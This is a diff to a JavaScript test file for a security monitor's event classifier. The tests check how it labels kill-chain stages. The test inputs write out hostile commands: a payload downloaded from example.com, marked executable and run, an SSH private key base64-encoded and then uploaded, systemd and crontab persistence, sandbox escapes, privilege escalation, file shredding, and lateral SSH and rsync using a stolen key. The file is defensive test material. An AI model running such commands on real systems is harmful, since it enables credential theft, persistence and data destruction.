@@ -41,6 +41,8 @@ function event(overrides = {}) {
     process: {
       pid: 1200,
       startTimeNs: '1200000000',
+      bootId: 'boot-test-1',
+      mountNamespace: 4026531840,
       hostId: 'node-1',
     },
     attribution: {
@@ -73,11 +75,100 @@ assert.equal(sensitiveRead.resourceType, 'file');
 assert.equal(sensitiveRead.sensitiveResource, true);
 assert.equal(sensitiveRead.behaviorStage, 'credential_access');
 assert.equal(sensitiveRead.synthetic, false);
+assert.equal(sensitiveRead.processIdentity.identityConfidence, 'strong');
+assert.match(sensitiveRead.processIdentity.processInstanceId, /^pri_[a-f0-9]{24}$/);
+assert.equal(sensitiveRead.fileIdentity?.identityBasis, 'scoped_path');
+assert.equal(sensitiveRead.fileIdentity?.identityConfidence, 'medium');
 assert.match(
   sensitiveRead.workspacePathFingerprint,
   /^sha256:[a-f0-9]{64}$/,
   'absolute local workspaces must be eligible for supply-chain matching',
 );
+
+const observedWrite = canonicalizeEvent(
+  event({
+    eventId: 'evt_observed_write',
+    sourceEventId: 'observer-write',
+    eventKind: 'FileAccess',
+    subject: 'file /tmp/temporal-payload',
+    // A write-open event may be consumed after the short-lived process exits,
+    // so /proc-derived start time and mount namespace are legitimately absent.
+    process: {
+      pid: 1200,
+      bootId: 'boot-test-1',
+    },
+  }),
+  observer('FileAccess', { path: '/tmp/temporal-payload', write: true }),
+);
+assert.equal(observedWrite.operation, 'file_write');
+assert.equal(observedWrite.behaviorStage, 'file_written');
+assert.notEqual(
+  observedWrite.behaviorStage,
+  'credential_access',
+  'Observer write-only FileAccess must not be mislabeled as a sensitive read',
+);
+
+const downloaded = canonicalizeEvent(
+  event({
+    eventId: 'evt_download',
+    sourceEventId: 'observer-download',
+  }),
+  observer('ToolExec', {
+    argv: ['curl', '-o', '/tmp/temporal-payload', 'https://example.com/payload'],
+  }),
+);
+assert.equal(downloaded.operation, 'download');
+assert.equal(downloaded.behaviorStage, 'download');
+assert.equal(downloaded.resource, '/tmp/temporal-payload');
+assert.equal(downloaded.destination, 'example.com');
+assert.equal(
+  downloaded.fileIdentity?.fileInstanceId,
+  observedWrite.fileIdentity?.fileInstanceId,
+  'missing best-effort mount metadata must not split one scoped-path file identity',
+);
+const wgetDownload = canonicalizeEvent(
+  event({ eventId: 'evt_wget_download', sourceEventId: 'observer-wget-download' }),
+  observer('ToolExec', {
+    argv: ['wget', '--output-document=/tmp/temporal-payload', 'https://example.com/payload'],
+  }),
+);
+assert.equal(wgetDownload.operation, 'download');
+assert.equal(wgetDownload.resource, '/tmp/temporal-payload');
+assert.equal(wgetDownload.destination, 'example.com');
+
+const permissionChanged = canonicalizeEvent(
+  event({
+    eventId: 'evt_chmod',
+    sourceEventId: 'observer-chmod',
+  }),
+  observer('ToolExec', { argv: ['chmod', '+x', '/tmp/temporal-payload'] }),
+);
+assert.equal(permissionChanged.operation, 'chmod');
+assert.equal(permissionChanged.behaviorStage, 'permission_change');
+assert.equal(permissionChanged.fileIdentity?.fileInstanceId, downloaded.fileIdentity?.fileInstanceId);
+
+const executedPayload = canonicalizeEvent(
+  event({
+    eventId: 'evt_execute_payload',
+    sourceEventId: 'observer-execute-payload',
+  }),
+  observer('ToolExec', { argv: ['/tmp/temporal-payload'] }),
+);
+assert.equal(executedPayload.operation, 'execute');
+assert.equal(executedPayload.behaviorStage, 'file_execution');
+assert.equal(executedPayload.fileIdentity?.fileInstanceId, downloaded.fileIdentity?.fileInstanceId);
+
+const shellExecution = canonicalizeEvent(
+  event({
+    eventId: 'evt_shell',
+    sourceEventId: 'observer-shell',
+  }),
+  observer('ToolExec', { argv: ['bash', '-c', 'printf ok'] }),
+);
+assert.equal(shellExecution.operation, 'execute');
+assert.equal(shellExecution.resourceType, 'process');
+assert.equal(shellExecution.behaviorStage, 'shell_execution');
+assert.equal(shellExecution.fileIdentity, undefined);
 
 const logicalWorkspace = canonicalizeEvent(
   event({
@@ -105,6 +196,12 @@ const encoded = canonicalizeEvent(
 assert.equal(encoded.operation, 'encode');
 assert.equal(encoded.behaviorStage, 'transform');
 assert.match(encoded.command, /^base64 /);
+const opensslEncoded = canonicalizeEvent(
+  event({ eventId: 'evt_openssl_encode', sourceEventId: 'observer-openssl-encode' }),
+  observer('ToolExec', { argv: ['openssl', 'base64', '-in', '/home/test/.ssh/id_rsa'] }),
+);
+assert.equal(opensslEncoded.operation, 'encode');
+assert.equal(opensslEncoded.behaviorStage, 'transform');
 
 const egress = canonicalizeEvent(
   event({
@@ -118,6 +215,159 @@ assert.equal(egress.operation, 'egress');
 assert.equal(egress.destination, 'example.com');
 assert.equal(egress.externalDestination, true);
 assert.equal(egress.behaviorStage, 'external_egress');
+
+const discardedEgress = canonicalizeEvent(
+  event({
+    eventId: 'evt_source_record_discarded_egress',
+    sourceEventId: 'observer-source-event-discarded-egress',
+    at: sensitiveRead.eventTime + 2_500,
+  }),
+  observer('ToolExec', {
+    argv: ['curl', '-fsS', '-o', '/dev/null', 'https://example.com/upload'],
+  }),
+);
+assert.equal(
+  discardedEgress.operation,
+  'egress',
+  'discarding an HTTP response to /dev/null must not be treated as a downloaded file',
+);
+assert.equal(discardedEgress.destination, 'example.com');
+assert.equal(discardedEgress.behaviorStage, 'external_egress');
+
+const persistenceWrite = canonicalizeEvent(
+  event({
+    eventId: 'evt_persistence_write',
+    sourceEventId: 'observer-persistence-write',
+    eventKind: 'FileAccess',
+    subject: 'file /etc/systemd/system/anysentry-demo.service',
+  }),
+  observer('FileAccess', {
+    path: '/etc/systemd/system/anysentry-demo.service',
+    write: true,
+  }),
+);
+assert.equal(persistenceWrite.operation, 'file_write');
+assert.equal(persistenceWrite.behaviorStage, 'persistence_write');
+const persistenceActivation = canonicalizeEvent(
+  event({
+    eventId: 'evt_persistence_activation',
+    sourceEventId: 'observer-persistence-activation',
+  }),
+  observer('ToolExec', {
+    argv: ['systemctl', 'enable', '/etc/systemd/system/anysentry-demo.service'],
+  }),
+);
+assert.equal(persistenceActivation.operation, 'persistence_activate');
+assert.equal(persistenceActivation.behaviorStage, 'persistence_activation');
+assert.equal(
+  persistenceActivation.fileIdentity?.fileInstanceId,
+  persistenceWrite.fileIdentity?.fileInstanceId,
+);
+const crontabActivation = canonicalizeEvent(
+  event({ eventId: 'evt_crontab_activation', sourceEventId: 'observer-crontab-activation' }),
+  observer('ToolExec', { argv: ['crontab', '/workspace/project/job.cron'] }),
+);
+assert.equal(crontabActivation.operation, 'persistence_activate');
+assert.equal(crontabActivation.resource, '/workspace/project/job.cron');
+
+const sandboxProbe = canonicalizeEvent(
+  event({
+    eventId: 'evt_sandbox_probe',
+    sourceEventId: 'observer-sandbox-probe',
+  }),
+  observer('ToolExec', {
+    argv: ['unshare', '--user', '--mount', '/bin/sh'],
+  }),
+);
+assert.equal(sandboxProbe.operation, 'sandbox_probe');
+assert.equal(sandboxProbe.behaviorStage, 'sandbox_probe');
+assert.equal(sandboxProbe.platformRuntime, false);
+const nsenterProbe = canonicalizeEvent(
+  event({ eventId: 'evt_nsenter_probe', sourceEventId: 'observer-nsenter-probe' }),
+  observer('ToolExec', { argv: ['nsenter', '--target', '1', '--mount', '/bin/true'] }),
+);
+assert.equal(nsenterProbe.operation, 'sandbox_probe');
+const privilegeChange = canonicalizeEvent(
+  event({
+    eventId: 'evt_privilege_change',
+    sourceEventId: 'observer-privilege-change',
+  }),
+  observer('ToolExec', {
+    argv: ['sudo', '-n', 'bash'],
+  }),
+);
+assert.equal(privilegeChange.operation, 'privilege_change');
+assert.equal(privilegeChange.behaviorStage, 'privilege_change');
+const capabilityChange = canonicalizeEvent(
+  event({ eventId: 'evt_setcap', sourceEventId: 'observer-setcap' }),
+  observer('ToolExec', { argv: ['setcap', 'cap_setuid+ep', '/tmp/helper'] }),
+);
+assert.equal(capabilityChange.operation, 'privilege_change');
+
+const targetDiscovery = canonicalizeEvent(
+  event({
+    eventId: 'evt_target_discovery',
+    sourceEventId: 'observer-target-discovery',
+  }),
+  observer('ToolExec', {
+    argv: ['find', '/tmp/anysentry-victim', '-type', 'f'],
+  }),
+);
+assert.equal(targetDiscovery.operation, 'target_discovery');
+assert.equal(targetDiscovery.resource, '/tmp/anysentry-victim');
+const destructiveAction = canonicalizeEvent(
+  event({
+    eventId: 'evt_destructive_action',
+    sourceEventId: 'observer-destructive-action',
+  }),
+  observer('ToolExec', {
+    argv: ['rm', '-f', '/tmp/anysentry-victim/a'],
+  }),
+);
+assert.equal(destructiveAction.operation, 'destroy');
+assert.equal(destructiveAction.behaviorStage, 'destructive_action');
+assert.equal(destructiveAction.resource, '/tmp/anysentry-victim/a');
+const shredAction = canonicalizeEvent(
+  event({ eventId: 'evt_shred_action', sourceEventId: 'observer-shred-action' }),
+  observer('ToolExec', { argv: ['shred', '-u', '/tmp/anysentry-victim/b'] }),
+);
+assert.equal(shredAction.operation, 'destroy');
+assert.equal(shredAction.resource, '/tmp/anysentry-victim/b');
+
+const lateralConnect = canonicalizeEvent(
+  event({
+    eventId: 'evt_lateral_connect',
+    sourceEventId: 'observer-lateral-connect',
+  }),
+  observer('ToolExec', {
+    argv: ['ssh', '-i', '/home/test/.ssh/id_rsa', '-N', '10.0.0.8'],
+  }),
+);
+assert.equal(lateralConnect.operation, 'remote_connect');
+assert.equal(lateralConnect.behaviorStage, 'lateral_connect');
+assert.equal(lateralConnect.destination, '10.0.0.8');
+assert.equal(lateralConnect.resource, '/home/test/.ssh/id_rsa');
+const lateralAction = canonicalizeEvent(
+  event({
+    eventId: 'evt_lateral_action',
+    sourceEventId: 'observer-lateral-action',
+  }),
+  observer('ToolExec', {
+    argv: ['ssh', '-i', '/home/test/.ssh/id_rsa', '10.0.0.8', 'id'],
+  }),
+);
+assert.equal(lateralAction.operation, 'remote_execute');
+assert.equal(lateralAction.behaviorStage, 'lateral_action');
+assert.equal(lateralAction.destination, lateralConnect.destination);
+assert.equal(lateralAction.fileIdentity?.fileInstanceId, lateralConnect.fileIdentity?.fileInstanceId);
+const rsyncAction = canonicalizeEvent(
+  event({ eventId: 'evt_rsync_action', sourceEventId: 'observer-rsync-action' }),
+  observer('ToolExec', {
+    argv: ['rsync', '-e', 'ssh -i /home/test/.ssh/id_rsa', '/tmp/a', 'user@10.0.0.8:/tmp/a'],
+  }),
+);
+assert.equal(rsyncAction.operation, 'remote_copy');
+assert.equal(rsyncAction.destination, '10.0.0.8');
 
 const platformSandbox = canonicalizeEvent(
   event({
